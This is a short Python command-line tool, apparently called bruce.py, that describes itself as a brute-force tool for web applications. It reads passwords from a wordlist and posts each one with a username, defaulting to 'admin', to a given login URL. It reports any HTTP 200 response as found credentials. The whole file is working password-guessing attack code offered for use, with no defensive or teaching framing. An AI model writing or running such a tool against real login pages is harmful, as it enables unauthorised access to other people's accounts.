import argparse
import os
import requests
import time

def user_inputs():
    parser = argparse.ArgumentParser(description="Brute force tool for web applications")
    parser.add_argument("-u", "--username", dest="username", help="Specify the username")
    parser.add_argument("-w", "--wordlist", dest="wordlist", help="Specify the wordlist")
    parser.add_argument("-U", "--url", dest="url", help="Specify the URL")
    args = parser.parse_args()

    print(r"""

    Example Usage: python bruce.py -U [url] -w [wordlist]
    """)

    if not args.username:
        print("Username not specified. Defaulting to 'admin'.")
        args.username = "admin"

    if not args.wordlist:
        if os.path.exists("wordlist.txt"):
            args.wordlist = "wordlist.txt"
        else:
            while args.wordlist is None:
                args.wordlist = input("Enter the wordlist: ")

    if not args.url:
        while args.url is None:
            args.url = input("Enter the URL: ")

    return args

def validate_url(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print("URL is valid. Brute force starting...")
            return True
        else:
            print(f"Invalid URL. Status code: {response.status_code}")
            return False
    except requests.ConnectionError:
        print("Failed to connect to the URL. Please check your internet connection.")
        return False
    except Exception as e:
        print(f"An error occurred: {e}")
        return False

def brute_force(username, wordlist, url):
    start_time = time.time()
    try:
        with open(wordlist, "r") as file:
            for password in file:
                password = password.strip()
                data = {'username': username, 'password': password}
                response = requests.post(url, data=data)
                if response.status_code == 200:
                    print(f"Found credentials: Username: {username}, Password: {password}")
                    check = input("Exit?(Y/n)")
                    if check.lower() == "n":
                        continue
                    elif check.lower() == "y":
                        break
    except FileNotFoundError:
        print("Wordlist file not found.")
    except Exception as e:
        print("An error occurred during brute force:", e)
    finally:
        end_time = time.time() 
        elapsed_time = end_time - start_time  
        print(f"Brute force completed. It took {elapsed_time:.2f} seconds.")


if __name__ == "__main__":
    args = user_inputs()
    if validate_url(args.url):
        brute_force(args.username, args.wordlist, args.url)
